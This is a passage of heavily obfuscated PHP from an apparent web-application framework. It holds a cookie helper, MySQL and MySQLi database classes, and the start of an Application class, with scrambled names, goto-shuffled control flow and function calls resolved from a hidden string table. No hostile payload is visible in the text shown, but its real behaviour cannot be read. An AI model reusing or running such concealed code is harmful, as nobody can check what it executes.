(is_numeric($A¨˜µÅê²‰) && $A¨˜µÅê²‰ > 0) { $this->expire = $A¨˜µÅê²‰; } } public static function getInstance() { static $Eì†ß«×Ì; if ($Eì†ß«×Ì === null) { $Eì†ß«×Ì = new self(); } return $Eì†ß«×Ì; } private static $sameCookieSet = array(); public static function set($BÙßŠ¿ƒôÌ, $E©«Ø™Á‹†, $A¥’ËÍ = 0, $aáˆÏì½— = false, $C³ÛÂ®¹Í = false) { goto aËˆ®ÎâäÛ; b”‹Ç«™Ûì: setcookie($BÙßŠ¿ƒôÌ, $E©«Ø™Á‹†, time() + $A¥’ËÍ, $aëö–‹Òñ[8] . trim($C³ÛÂ®¹Í, $aëö–‹Òñ[8]) . $Bµ¢Ì¨Ç²Ü, !1, !1, $aáˆÏì½—); goto D÷Ÿ¯••Õ; aËˆ®ÎâäÛ: $aëö–‹Òñ =& $_SERVER[Ä¿Ş°¨]; if (!$A¥’ËÍ) { $A¥’ËÍ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$BÙßŠ¿ƒôÌ]) && self::$sameCookieSet[$BÙßŠ¿ƒôÌ] == $E©«Ø™Á‹† . $A¥’ËÍ) { return; } goto CÖƒØ‡ÒÎÃ; CÖƒØ‡ÒÎÃ: self::$sameCookieSet[$BÙßŠ¿ƒôÌ] = $E©«Ø™Á‹† . $A¥’ËÍ; if (!$C³ÛÂ®¹Í) { $C³ÛÂ®¹Í = str_replace(HOST, $aëö–‹Òñ[33], APP_HOST); $C³ÛÂ®¹Í = _get($GLOBALS, $aëö–‹Òñ[784], $C³ÛÂ®¹Í); } $Bµ¢Ì¨Ç²Ü = $aëö–‹Òñ[33]; goto b”‹Ç«™Ûì; D÷Ÿ¯••Õ: } public static function setSafe($B¢ó‡¤Õåâ, $càå„¼®£¥, $FòÀ‚ÑÚ’  = 0) { self::set($B¢ó‡¤Õåâ, $càå„¼®£¥, $FòÀ‚ÑÚ’ , !0); } public static function get($E—Ê¯ë«±â) { return isset($_COOKIE[$E—Ê¯ë«±â]) ? $_COOKIE[$E—Ê¯ë«±â] : !1; } public static function remove($FŞ¾é¯Ğé, $FÖõİÅñ¼Í = false) { unset($_COOKIE[$FŞ¾é¯Ğé]); self::set($FŞ¾é¯Ğé, $_SERVER[Ä¿Ş°¨][33], 1, $FÖõİÅñ¼Í); } } class DbMysql extends Db { public function __construct($C¸‹ãØ•Üï = '') { $d’Ç‹¾Áœ« =& $_SERVER[Ä¿Ş°¨]; if (!extension_loaded($d’Ç‹¾Áœ«[722])) { think_exception(think_lang($d’Ç‹¾Áœ«[10]) . $d’Ç‹¾Áœ«[785]); } if (!empty($C¸‹ãØ•Üï)) { $this->config = $C¸‹ãØ•Üï; if (empty($this->config[$d’Ç‹¾Áœ«[13]])) { $this->config[$d’Ç‹¾Áœ«[13]] = $d’Ç‹¾Áœ«[33]; } } } public function connect($a³ñÕ¬¹‰† = '', $CÛ‘„ ¤² = 0, $DƒÙ°¸äèò = false) { $F’ò¥„·—“ =& $_SERVER[Ä¿Ş°¨]; if (!isset($this->linkID[$CÛ‘„ ¤²])) { goto DÅ‹õäÏ‚; A’§×‚é™è: mysql_query($F’ò¥„·—“[790] . think_config($F’ò¥„·—“[791]) . $F’ò¥„·—“[55], $this->linkID[$CÛ‘„ ¤²]); if ($aŠƒæÛæµë > $F’ò¥„·—“[792]) { mysql_query($F’ò¥„·—“[793], $this->linkID[$CÛ‘„ ¤²]); } $this->connected = !0; goto C­ÌÌ¨¸Ì; C­ÌÌ¨¸Ì: if (1 != think_config($F’ò¥„·—“[18])) { unset($this->config); } goto A…é¸Àìò; DÅ‹õäÏ‚: if (empty($a³ñÕ¬¹‰†)) { $a³ñÕ¬¹‰† = $this->config; } $D‚ †ÂÂÁ“ = $a³ñÕ¬¹‰†[$F’ò¥„·—“[786]] . ($a³ñÕ¬¹‰†[$F’ò¥„·—“[787]] ? "\72{$a³ñÕ¬¹‰†[$F’ò¥„·—“[787]]}" : $F’ò¥„·—“[33]); $eÁ÷¨ğ† = !empty($a³ñÕ¬¹‰†[$F’ò¥„·—“[13]][$F’ò¥„·—“[14]]) ? $a³ñÕ¬¹‰†[$F’ò¥„·—“[13]][$F’ò¥„·—“[14]] : $this->pconnect; goto B´ÍßÃæÙÆ; B´ÍßÃæÙÆ: if ($eÁ÷¨ğ†) { $this->linkID[$CÛ‘„ ¤²] = mysql_pconnect($D‚ †ÂÂÁ“, $a³ñÕ¬¹‰†[$F’ò¥„·—“[788]], $a³ñÕ¬¹‰†[$F’ò¥„·—“[789]], 131072); } else { $this->linkID[$CÛ‘„ ¤²] = mysql_connect($D‚ †ÂÂÁ“, $a³ñÕ¬¹‰†[$F’ò¥„·—“[788]], $a³ñÕ¬¹‰†[$F’ò¥„·—“[789]], !0, 131072); } if (!$this->linkID[$CÛ‘„ ¤²] || !empty($a³ñÕ¬¹‰†[$F’ò¥„·—“[17]]) && !mysql_select_db($a³ñÕ¬¹‰†[$F’ò¥„·—“[17]], $this->linkID[$CÛ‘„ ¤²])) { think_exception(mysql_error()); } $aŠƒæÛæµë = mysql_get_server_info($this->linkID[$CÛ‘„ ¤²]); goto A’§×‚é™è; A…é¸Àìò: } return $this->linkID[$CÛ‘„ ¤²]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($C­¢õÅÊ³á) { goto e¼”»ƒÚ; aÖ¼‘³÷–˜: think_action_status($Eğâ“¾Î×‘[19], 1); think_status($Eğâ“¾Î×‘[20]); $this->queryID = mysql_query($C­¢õÅÊ³á, $this->_linkID); goto dï‚Ñãøäµ; Aïˆ•«˜éæ: if (!$this->_linkID) { return !1; } $this->queryStr = $C­¢õÅÊ³á; if ($this->queryID) { $this->free(); } goto aÖ¼‘³÷–˜; e¼”»ƒÚ: $Eğâ“¾Î×‘ =& $_SERVER[Ä¿Ş°¨]; if (0 === stripos($C­¢õÅÊ³á, $Eğâ“¾Î×‘[248])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto Aïˆ•«˜éæ; dï‚Ñãøäµ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto c“šÁŒ…ùğ; c“šÁŒ…ùğ: } public function execute($f¢Ù­¨ë¿) { goto A›àÈ•»ø; A›àÈ•»ø: $Bº»É­Æ =& $_SERVER[Ä¿Ş°¨]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto CÀ©ó•´µÍ; CÀ©ó•´µÍ: $this->queryStr = $f¢Ù­¨ë¿; if ($this->queryID) { $this->free(); } think_action_status($Bº»É­Æ[21], 1); goto a«‘Æ›¸¿; e¾¬š¦ó¡ä: if (!1 === $eğçêï¡‡©) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto DË”‡× Õ; a«‘Æ›¸¿: think_status($Bº»É­Æ[20]); $eğçêï¡‡© = mysql_query($f¢Ù­¨ë¿, $this->_linkID); $this->debug(); goto e¾¬š¦ó¡ä; DË”‡× Õ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ä¿Ş°¨][794], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f«Û‹öØ¢ = mysql_query($_SERVER[Ä¿Ş°¨][795], $this->_linkID); $this->transTimes = 0; if (!$f«Û‹öØ¢) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $a–õ£ï”‚Ë = mysql_query($_SERVER[Ä¿Ş°¨][796], $this->_linkID); $this->transTimes = 0; if (!$a–õ£ï”‚Ë) { $this->error(); return !1; } } return !0; } private function getAll() { $b„ƒİù—Æä = array(); if ($this->numRows > 0) { while ($Eá„ÆâĞÇÊ = mysql_fetch_assoc($this->queryID)) { $b„ƒİù—Æä[] = $Eá„ÆâĞÇÊ; } mysql_data_seek($this->queryID, 0); } return $b„ƒİù—Æä; } public function getFields($fÈ‚ÙîƒÔÈ) { $a¬¯Ğæ›ÃÑ =& $_SERVER[Ä¿Ş°¨]; $c­¦Íéâï = $this->query($a¬¯Ğæ›ÃÑ[797] . $this->parseKey($fÈ‚ÙîƒÔÈ)); $f’Úƒé˜Øè = array(); if ($c­¦Íéâï) { foreach ($c­¦Íéâï as $C—åˆİÏ‡Ğ => $d»…£‹ªêö) { $f’Úƒé˜Øè[$d»…£‹ªêö[$a¬¯Ğæ›ÃÑ[27]]] = array($a¬¯Ğæ›ÃÑ[28] => $d»…£‹ªêö[$a¬¯Ğæ›ÃÑ[27]], $a¬¯Ğæ›ÃÑ[29] => $d»…£‹ªêö[$a¬¯Ğæ›ÃÑ[30]], $a¬¯Ğæ›ÃÑ[31] => (bool) (strtoupper($d»…£‹ªêö[$a¬¯Ğæ›ÃÑ[32]]) === $a¬¯Ğæ›ÃÑ[798]), $a¬¯Ğæ›ÃÑ[34] => $d»…£‹ªêö[$a¬¯Ğæ›ÃÑ[35]], $a¬¯Ğæ›ÃÑ[36] => strtolower($d»…£‹ªêö[$a¬¯Ğæ›ÃÑ[37]]) == $a¬¯Ğæ›ÃÑ[38], $a¬¯Ğæ›ÃÑ[39] => strtolower($d»…£‹ªêö[$a¬¯Ğæ›ÃÑ[40]]) == $a¬¯Ğæ›ÃÑ[41]); } } return $f’Úƒé˜Øè; } public function getTables($fíÏÛªºçß = '') { $DïÌˆ‚ğåï =& $_SERVER[Ä¿Ş°¨]; if (!empty($fíÏÛªºçß)) { $aëÑÒ»šÜ = $DïÌˆ‚ğåï[799] . $fíÏÛªºçß; } else { $aëÑÒ»šÜ = $DïÌˆ‚ğåï[800]; } $dŞŠİŠ±´Ô = $this->query($aëÑÒ»šÜ); $D‚Œ—‹‡»¼ = array(); foreach ($dŞŠİŠ±´Ô as $D›†…ãÆ…ã => $fõêÈ…æ‡¹) { $D‚Œ—‹‡»¼[$D›†…ãÆ…ã] = current($fõêÈ…æ‡¹); } return $D‚Œ—‹‡»¼; } public function replace($E›î±½Â®Œ, $cõ…Ü¬‹¾ = array()) { $aÊõíŠ½ä =& $_SERVER[Ä¿Ş°¨]; foreach ($E›î±½Â®Œ as $B¶óˆÉ–¼½ => $b”Ü‘¼Ç¡ä) { $cÃá½ƒŸ» = $this->parseValue($b”Ü‘¼Ç¡ä); if (is_scalar($cÃá½ƒŸ»)) { $d“ÇìÂ[] = $cÃá½ƒŸ»; $E ¿‰öóéÖ[] = $this->parseKey($B¶óˆÉ–¼½); } } $bÑ¯¹ö—õò = $aÊõíŠ½ä[801] . $this->parseTable($cõ…Ü¬‹¾[$aÊõíŠ½ä[263]]) . $aÊõíŠ½ä[802] . implode($aÊõíŠ½ä[47], $E ¿‰öóéÖ) . $aÊõíŠ½ä[803] . implode($aÊõíŠ½ä[47], $d“ÇìÂ) . $aÊõíŠ½ä[804]; return $this->execute($bÑ¯¹ö—õò); } public function insertAll($BÁà‰™É±“, $F“İ‡†„… = array(), $E¢Ç®¼º´ì = false) { goto BŞÚŠ¶Ğã; BŞÚŠ¶Ğã: $däÂŠ¾Éê =& $_SERVER[Ä¿Ş°¨]; if (!is_array($BÁà‰™É±“[0])) { return !1; } $F‚¥§Ë§¿ = array_keys($BÁà‰™É±“[0]); goto dÈÑœªŠˆ’; dÈÑœªŠˆ’: $cõ­ÖèºÕé = array(); foreach ($BÁà‰™É±“ as $bèÎà…¯Äæ) { $eĞƒ‡»ÁÌê = array(); foreach ($bèÎà…¯Äæ as $cÃ™à‰«· => $fã„ùîã‹) { $fã„ùîã‹ = $this->parseValue($fã„ùîã‹); if (is_scalar($fã„ùîã‹)) { $eĞƒ‡»ÁÌê[] = $fã„ùîã‹; } } $cõ­ÖèºÕé[] = $däÂŠ¾Éê[244] . implode($däÂŠ¾Éê[47], $eĞƒ‡»ÁÌê) . $däÂŠ¾Éê[804]; } array_walk($F‚¥§Ë§¿, array($this, $däÂŠ¾Éê[805])); goto B¿ôåÂ°; B¿ôåÂ°: $D³¦¨Ğ‰òè = ($E¢Ç®¼º´ì ? $däÂŠ¾Éê[806] : $däÂŠ¾Éê[807]) . $däÂŠ¾Éê[808] . $this->parseTable($F“İ‡†„…[$däÂŠ¾Éê[263]]) . $däÂŠ¾Éê[802] . implode($däÂŠ¾Éê[47], $F‚¥§Ë§¿) . $däÂŠ¾Éê[809] . implode($däÂŠ¾Éê[47], $cõ­ÖèºÕé); return $this->execute($D³¦¨Ğ‰òè); goto Aéß­°„Ğ‚; Aéß­°„Ğ‚: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $bçö£„İİã =& $_SERVER[Ä¿Ş°¨]; $this->error = mysql_errno() . $bçö£„İİã[4] . mysql_error($this->_linkID); if ($bçö£„İİã[33] != $this->queryStr) { $this->error .= LNG($bçö£„İİã[45]) . $this->queryStr; } think_trace($this->error, $bçö£„İİã[33], $bçö£„İİã[46]); return $this->error; } public function escapeString($A‡¨µÃÄÄ) { if ($this->_linkID) { return mysql_real_escape_string($A‡¨µÃÄÄ, $this->_linkID); } else { return mysql_escape_string($A‡¨µÃÄÄ); } } public function parseKey(&$f‘§ŒÉÜµ, $cï½ŸµÇ¢ = true) { $Fõ‹¤ˆŠÖ =& $_SERVER[Ä¿Ş°¨]; if ($cï½ŸµÇ¢) { $f‘§ŒÉÜµ = $this->parseKeyCheck($f‘§ŒÉÜµ); } if ($f‘§ŒÉÜµ != $Fõ‹¤ˆŠÖ[172] && !preg_match($Fõ‹¤ˆŠÖ[810], $f‘§ŒÉÜµ)) { $f‘§ŒÉÜµ = $Fõ‹¤ˆŠÖ[811] . trim($f‘§ŒÉÜµ, $Fõ‹¤ˆŠÖ[811]) . $Fõ‹¤ˆŠÖ[811]; } return $f‘§ŒÉÜµ; } } class DbMysqli extends Db { public function __construct($eÚäÇæŸ¡ = '') { $BÌÆ¦Ã°Ñ =& $_SERVER[Ä¿Ş°¨]; if (!extension_loaded($BÌÆ¦Ã°Ñ[721])) { think_exception(think_lang($BÌÆ¦Ã°Ñ[10]) . $BÌÆ¦Ã°Ñ[812]); } if (!empty($eÚäÇæŸ¡)) { $this->config = $eÚäÇæŸ¡; if (empty($this->config[$BÌÆ¦Ã°Ñ[13]])) { $this->config[$BÌÆ¦Ã°Ñ[13]] = $BÌÆ¦Ã°Ñ[33]; } } } public function connect($FŠÍŞ×Û„‘ = '', $BãĞ†àÕ³ë = 0) { $EÍ¤‘ÜÒŞÉ =& $_SERVER[Ä¿Ş°¨]; if (!isset($this->linkID[$BãĞ†àÕ³ë])) { goto FÍ™”ãùËê; D™³æŠí«Ş: $b¡£Ğ¢ğñ = $this->linkID[$BãĞ†àÕ³ë]->server_version; $this->linkID[$BãĞ†àÕ³ë]->query($EÍ¤‘ÜÒŞÉ[790] . think_config($EÍ¤‘ÜÒŞÉ[791]) . $EÍ¤‘ÜÒŞÉ[55]); if ($b¡£Ğ¢ğñ > $EÍ¤‘ÜÒŞÉ[792]) { $this->linkID[$BãĞ†àÕ³ë]->query($EÍ¤‘ÜÒŞÉ[793]); } goto Aå³‹ù¼ê; FÍ™”ãùËê: if (empty($FŠÍŞ×Û„‘)) { $FŠÍŞ×Û„‘ = $this->config; } $this->linkID[$BãĞ†àÕ³ë] = new mysqli($FŠÍŞ×Û„‘[$EÍ¤‘ÜÒŞÉ[786]], $FŠÍŞ×Û„‘[$EÍ¤‘ÜÒŞÉ[788]], $FŠÍŞ×Û„‘[$EÍ¤‘ÜÒŞÉ[789]], $FŠÍŞ×Û„‘[$EÍ¤‘ÜÒŞÉ[17]], $FŠÍŞ×Û„‘[$EÍ¤‘ÜÒŞÉ[787]] ? intval($FŠÍŞ×Û„‘[$EÍ¤‘ÜÒŞÉ[787]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto D™³æŠí«Ş; Aå³‹ù¼ê: $this->connected = !0; if (1 != think_config($EÍ¤‘ÜÒŞÉ[18])) { unset($this->config); } goto A¨¹ÊŒ›àª; A¨¹ÊŒ›àª: } return $this->linkID[$BãĞ†àÕ³ë]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Fµ¥—ª©”™) { goto aŞ…‡Ã‚ø; dééßæÃøÎ: $this->queryStr = $Fµ¥—ª©”™; if ($this->queryID) { $this->free(); } think_action_status($bÒ–ƒ¢†·¬[19], 1); goto dí¬Õ±¦ë¹; aŞ…‡Ã‚ø: $bÒ–ƒ¢†·¬ =& $_SERVER[Ä¿Ş°¨]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dééßæÃøÎ; b—ºâ×á‹°: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto EğÆ¾Ğ–¥Ù; dí¬Õ±¦ë¹: think_status($bÒ–ƒ¢†·¬[20]); $this->queryID = $this->_linkID->query($Fµ¥—ª©”™); if ($this->_linkID->more_results()) { while (($aŞöÍç»Æ‚ = $this->_linkID->next_result()) != NULL) { $aŞöÍç»Æ‚->free_result(); } } goto b—ºâ×á‹°; EğÆ¾Ğ–¥Ù: } public function execute($D³Ñ‰’Õ««) { goto e°•…›•«ø; e°•…›•«ø: $bÎ©„À¦ëÅ =& $_SERVER[Ä¿Ş°¨]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cœ´‰ò˜»; cœ´‰ò˜»: $this->queryStr = $D³Ñ‰’Õ««; if ($this->queryID) { $this->free(); } think_action_status($bÎ©„À¦ëÅ[21], 1); goto F¤‘ˆÒ½Å; F¤‘ˆÒ½Å: think_status($bÎ©„À¦ëÅ[20]); $cÂ½ã¶àà— = $this->_linkID->query($D³Ñ‰’Õ««); $this->debug(); goto B×ÏŞ¥â‰; B×ÏŞ¥â‰: if (!1 === $cÂ½ã¶àà—) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto F‘ßïÃ…„; F‘ßïÃ…„: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f´‹ÏÉÔ²´ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$f´‹ÏÉÔ²´) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Fºæã°öºŠ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Fºæã°öºŠ) { $this->error(); return !1; } } return !0; } private function getAll() { $bÀá‡š…ªá = array(); if ($this->numRows > 0) { for ($aÔ¶´İ˜”Ü = 0; $aÔ¶´İ˜”Ü < $this->numRows; $aÔ¶´İ˜”Ü++) { $bÀá‡š…ªá[$aÔ¶´İ˜”Ü] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $bÀá‡š…ªá; } public function getFields($bÔóªÊª™) { $FÏÖòŸ³²³ =& $_SERVER[Ä¿Ş°¨]; $A‹ˆÚÕ¢ÏÄ = $this->query($FÏÖòŸ³²³[797] . $this->parseKey($bÔóªÊª™)); $bŸ™„æÌŒœ = array(); if ($A‹ˆÚÕ¢ÏÄ) { foreach ($A‹ˆÚÕ¢ÏÄ as $e’ˆù¥‰â => $fã÷íÉ½²ñ) { $bŸ™„æÌŒœ[$fã÷íÉ½²ñ[$FÏÖòŸ³²³[27]]] = array($FÏÖòŸ³²³[28] => $fã÷íÉ½²ñ[$FÏÖòŸ³²³[27]], $FÏÖòŸ³²³[29] => $fã÷íÉ½²ñ[$FÏÖòŸ³²³[30]], $FÏÖòŸ³²³[31] => (bool) ($fã÷íÉ½²ñ[$FÏÖòŸ³²³[32]] === $FÏÖòŸ³²³[33]), $FÏÖòŸ³²³[34] => $fã÷íÉ½²ñ[$FÏÖòŸ³²³[35]], $FÏÖòŸ³²³[36] => strtolower($fã÷íÉ½²ñ[$FÏÖòŸ³²³[37]]) == $FÏÖòŸ³²³[38], $FÏÖòŸ³²³[39] => strtolower($fã÷íÉ½²ñ[$FÏÖòŸ³²³[40]]) == $FÏÖòŸ³²³[41]); } } return $bŸ™„æÌŒœ; } public function getTables($D“íñŒá˜ª = '') { $Cò©å¥ˆ‚ =& $_SERVER[Ä¿Ş°¨]; $AæŠã«­‚ = !empty($D“íñŒá˜ª) ? $Cò©å¥ˆ‚[799] . $D“íñŒá˜ª : $Cò©å¥ˆ‚[800]; $F’ŸÉÂİƒƒ = $this->query($AæŠã«­‚); $b·»öí¡¨ = array(); if ($F’ŸÉÂİƒƒ) { foreach ($F’ŸÉÂİƒƒ as $f…Äõ†Ş => $b–ÄàòØïâ) { $b·»öí¡¨[$f…Äõ†Ş] = current($b–ÄàòØïâ); } } return $b·»öí¡¨; } public function replace($eËóÆ‚ĞßË, $Fã‹˜ÜÖ¹¶ = array()) { $C¶ğƒÀ¤ì =& $_SERVER[Ä¿Ş°¨]; foreach ($eËóÆ‚ĞßË as $Aæ›©ºòà => $aõ™ñÓê¾‘) { $D«¦£íÙÀŸ = $this->parseValue($aõ™ñÓê¾‘); if (is_scalar($D«¦£íÙÀŸ)) { $Aˆš¥—àÂ[] = $D«¦£íÙÀŸ; $Fâİ…°’Š[] = $this->parseKey($Aæ›©ºòà); } } $BÁ¡Ú‡Çì¿ = $C¶ğƒÀ¤ì[801] . $this->parseTable($Fã‹˜ÜÖ¹¶[$C¶ğƒÀ¤ì[263]]) . $C¶ğƒÀ¤ì[802] . implode($C¶ğƒÀ¤ì[47], $Fâİ…°’Š) . $C¶ğƒÀ¤ì[803] . implode($C¶ğƒÀ¤ì[47], $Aˆš¥—àÂ) . $C¶ğƒÀ¤ì[804]; return $this->execute($BÁ¡Ú‡Çì¿); } public function insertAll($b±ˆùô ³, $D²¼§’Â®ç = array(), $f¿–‹ˆóâ· = false) { goto C±éÁÊÆõ; b×œ¬Ñ”¤ª: $DíÄçÒî = array(); foreach ($b±ˆùô ³ as $C–É…ã) { $CìÎ»¯‘£ = array(); foreach ($C–É…ã as $d©ìß„©Æ => $F˜ÄïÍ™Ü) { $F˜ÄïÍ™Ü = $this->parseValue($F˜ÄïÍ™Ü); if (is_scalar($F˜ÄïÍ™Ü)) { $CìÎ»¯‘£[] = $F˜ÄïÍ™Ü; } } $DíÄçÒî[] = $fÔØ³¼¹ƒ¹[244] . implode($fÔØ³¼¹ƒ¹[47], $CìÎ»¯‘£) . $fÔØ³¼¹ƒ¹[804]; } array_walk($EÛŒÑƒ¥”ƒ, array($this, $fÔØ³¼¹ƒ¹[805])); goto eß¶èŠ¤‚Ù; C±éÁÊÆõ: $fÔØ³¼¹ƒ¹ =& $_SERVER[Ä¿Ş°¨]; if (!is_array($b±ˆùô ³[0])) { return !1; } $EÛŒÑƒ¥”ƒ = array_keys($b±ˆùô ³[0]); goto b×œ¬Ñ”¤ª; eß¶èŠ¤‚Ù: $Cˆ£±·ÌÎä = ($f¿–‹ˆóâ· ? $fÔØ³¼¹ƒ¹[806] : $fÔØ³¼¹ƒ¹[807]) . $fÔØ³¼¹ƒ¹[808] . $this->parseTable($D²¼§’Â®ç[$fÔØ³¼¹ƒ¹[263]]) . $fÔØ³¼¹ƒ¹[802] . implode($fÔØ³¼¹ƒ¹[47], $EÛŒÑƒ¥”ƒ) . $fÔØ³¼¹ƒ¹[809] . implode($fÔØ³¼¹ƒ¹[47], $DíÄçÒî); return $this->execute($Cˆ£±·ÌÎä); goto d—ŠŠ¾ÂòÏ; d—ŠŠ¾ÂòÏ: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $bì½ÀˆØŒ¬ =& $_SERVER[Ä¿Ş°¨]; $this->error = $this->_linkID->errno . $bì½ÀˆØŒ¬[4] . $this->_linkID->error; if ($bì½ÀˆØŒ¬[33] != $this->queryStr) { $this->error .= LNG($bì½ÀˆØŒ¬[45]) . $this->queryStr; } think_trace($this->error, $bì½ÀˆØŒ¬[33], $bì½ÀˆØŒ¬[46]); return $this->error; } public function escapeString($A¨ê‚°†Çì) { if ($this->_linkID) { return $this->_linkID->real_escape_string($A¨ê‚°†Çì); } else { return addslashes($A¨ê‚°†Çì); } } public function parseKey(&$A¬¶Ë®†¤, $Cù†¸×®‚÷ = true) { $B»ÊŒíá =& $_SERVER[Ä¿Ş°¨]; if ($Cù†¸×®‚÷) { $A¬¶Ë®†¤ = $this->parseKeyCheck($A¬¶Ë®†¤); } if ($A¬¶Ë®†¤ != $B»ÊŒíá[172] && !preg_match($B»ÊŒíá[810], $A¬¶Ë®†¤)) { $A¬¶Ë®†¤ = $B»ÊŒíá[811] . trim($A¬¶Ë®†¤, $B»ÊŒíá[811]) . $B»ÊŒíá[811]; } return $A¬¶Ë®†¤; } } goto dëÕ†¹‹§Í; BˆÄï¨³Íç: class Application { private $defaultModule = "\151\156\x64\x65\170"; private $defaultController = "\x69\x6e\144\x65\x78"; private $defaultAction = "\151\156\x64\145\170"; function __construct() { } public function setDefault($eìÕŸƒÖŒ…) { goto E’…À¿„°; Fœ¤†¦¸–ô: $this->defaultModule = $AââÓ—º‘[0] ? $AââÓ—º‘[0] : $this->defaultModule; $D¸ßµøŠ£ç = $a­Ÿ‚ğã¸®[556]; while ($D¸ßµøŠ£ç < $a­Ÿ‚ğã¸®[557]) { if ($D¸ßµøŠ£ç >= 0) { break; } $D¸ßµøŠ£ç++; } goto FøÎ½ÛåËã; FøÎ½ÛåËã: $this->defaultController = $AââÓ—º‘[1] ? $AââÓ—º‘[1] : $this->defaultController; $AÆğåàŒ = $a­Ÿ‚ğã¸®[558]; while (strlen($AÆğåàŒ) < $a­Ÿ‚ğã¸®[559]) { if (!$AÆğåàŒ) { break; } $AÆğåàŒ++; } goto Cõ¡¤ŞøˆÓ; EÉ±Ö¹ÁÍ: while ($C°–­—ƒ×Æ < $a­Ÿ‚ğã¸®[555]) { if ($C°–­—ƒ×Æ >= 0) { break; } $C°–­—ƒ×Æ++; } goto D½†¬Ÿ³­; E’…À¿„°: $a­Ÿ‚ğã¸® =& $_SERVER[Ä¿Ş°¨]; $A„Ôğª¦ùÖ =& $_SERVER[‹‚–·¹Ÿ]; $AââÓ—º‘ = $A„Ôğª¦ùÖ[0]($A„Ôğª¦ùÖ[1], $A„Ôğª¦ùÖ[2]($eìÕŸƒÖŒ…, $A„Ôğª¦ùÖ[1])); goto Fœ¤†¦¸–ô; Cõ¡¤ŞøˆÓ: $this->defaultAction = $AââÓ—º‘[2] ? $AââÓ—º‘[2] : $this->defaultAction; $this->{$_SERVER[‹‚–·¹Ÿ][3]}($A„Ôğª¦ùÖ[4], array($this, $A„Ôğª¦ùÖ[5])); $C°–­—ƒ×Æ = $a­Ÿ‚ğã¸®[560]; goto EÉ±Ö¹ÁÍ; D½†¬Ÿ³­: } public function appRun($dÎ÷–Â¤õ) { goto dá¹âÖ´Ÿ; BçÜËß°Ë: $BËµŒË¶ó[17]($dÎ÷–Â¤õ); $BËµŒË¶ó[13](array($BËµŒË¶ó[14], $BËµŒË¶ó[15]), $C‚®ó­™ä¯ . $BËµŒË¶ó[18], $dÎ÷–Â¤õ); goto e ¯ºÅ­ˆ; C‹æÎ†¬…‰: $a˜æªê±´ = $A‡îŞªô§¯[561]; if (strlen($a˜æªê±´) < $A‡îŞªô§¯[555]) { return; } $Dßìâ…‚àù = $BËµŒË¶ó[6]($bÌ†–Ê„µƒ[0]); goto C¾ªšá†·â; C¾ªšá†·â: $C‚®ó­™ä¯ = $BËµŒË¶ó[7]; if ($Dßìâ…‚àù == $BËµŒË¶ó[8]) { $C‚®ó­™ä¯ = $BËµŒË¶ó[9]; $bÌ†–Ê„µƒ[0] = $BËµŒË¶ó[10]; $bÌ†–Ê„µƒ[1] = $bÌ†–Ê„µƒ[1] . $BËµŒË¶ó[11]; $dÎ÷–Â¤õ = $BËµŒË¶ó[12]($BËµŒË¶ó[1], $bÌ†–Ê„µƒ); $dÎ÷–Â¤õ = $BËµŒË¶ó[2]($dÎ÷–Â¤õ, $BËµŒË¶ó[1]); } $BËµŒË¶ó[13](array($BËµŒË¶ó[14], $BËµŒË¶ó[15]), $C‚®ó­™ä¯ . $BËµŒË¶ó[16], $dÎ÷–Â¤õ); goto BçÜËß°Ë; dá¹âÖ´Ÿ: $A‡îŞªô§¯ =& $_SERVER[Ä¿Ş°¨]; $BËµŒË¶ó =& $_SERVER[‹‚–·¹Ÿ]; $bÌ†–Ê„µƒ = $BËµŒË¶ó[0]($BËµŒË¶ó[1], $dÎ÷–Â¤õ); goto C‹æÎ†¬…‰; e ¯ºÅ­ˆ: } private function autorun() { $D˜œÎ²·Š =& $_SERVER[Ä¿Ş°¨]; $EàŞˆÄçÄ =& $_SERVER[‹‚–·¹Ÿ]; global $config; if ($EàŞˆÄçÄ[19]($config[$EàŞˆÄçÄ[20]]) == 0) { return; } foreach ($config[$EàŞˆÄçÄ[20]] as $Eì­½îÁİº => $fœõ×†¨ù‘) { $this->{$_SERVER[‹‚–·¹Ÿ][21]}($fœõ×†¨ù‘); $c¦â°ˆ’¥¬ = $D˜œÎ²·Š[562]; if (strlen($c¦â°ˆ’¥¬) < $D˜œÎ²·Š[563]) { die; } } } private function luiv01a105eb() { goto DÌ’©×‰Ö—; DÌ’©×‰Ö—: $C¦Š ‘½Ş =& $_SERVER[Ä¿Ş°¨]; $Eõ‡­“’Â =& $_SERVER[‹‚–·¹Ÿ]; $ešÁéÚŸ ¶ = $Eõ‡­“’Â[8]; goto D¿åšÚ–; b•Ï’×¨Ù: $f‹ëšäÇÓÊ = array($Eõ‡­“’Â[8], $B°¤Ğ†­¤); $E˜‚íƒğÙÙ = 